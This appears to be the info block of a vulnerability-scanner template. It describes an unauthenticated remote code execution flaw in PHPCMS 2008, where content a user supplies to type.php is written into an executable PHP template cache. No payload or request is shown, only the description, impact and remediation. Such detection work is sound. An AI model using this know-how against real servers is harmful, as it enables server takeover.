info:
  name: PHPCMS 2008 - Remote Code Execution via Template Injection
  author: tomaquet18
  severity: critical
  description: |
    PHPCMS 2008 suffers from an unauthenticated RCE via template injection in type.php, where attacker-supplied content is written into a PHP template cache file, which is then executable.
  impact: |
    Successful exploitation allows an unauthenticated attacker to achieve remote code execution on the server, potentially taking full control.
  remediation: |
    The vendor is unresponsive and PHPCMS 2008 is no longer maintained. Users are advised to stop using this software or restrict public access to it.
